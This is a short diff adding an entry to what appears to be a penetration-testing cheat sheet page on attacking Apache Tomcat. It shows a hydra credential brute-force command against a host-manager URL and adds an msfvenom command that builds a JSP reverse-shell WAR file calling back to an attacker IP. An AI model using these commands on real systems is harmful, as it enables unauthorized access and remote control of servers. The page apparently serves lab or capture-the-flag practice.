@@ -1008,6 +1008,11 @@ layout: default
 		<li>hydra -L words.lst -P words.lst http-get://10.0.0.25:8080/host-manager/html</li>
 	</ul>
 
+	<li>Deploy .war shell to /manager/html</li>
+	<ul>
+		<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f war > shell.war</li>
+	</ul>
+
 	<hr>
 
 	<h2>Wordpress</h2>
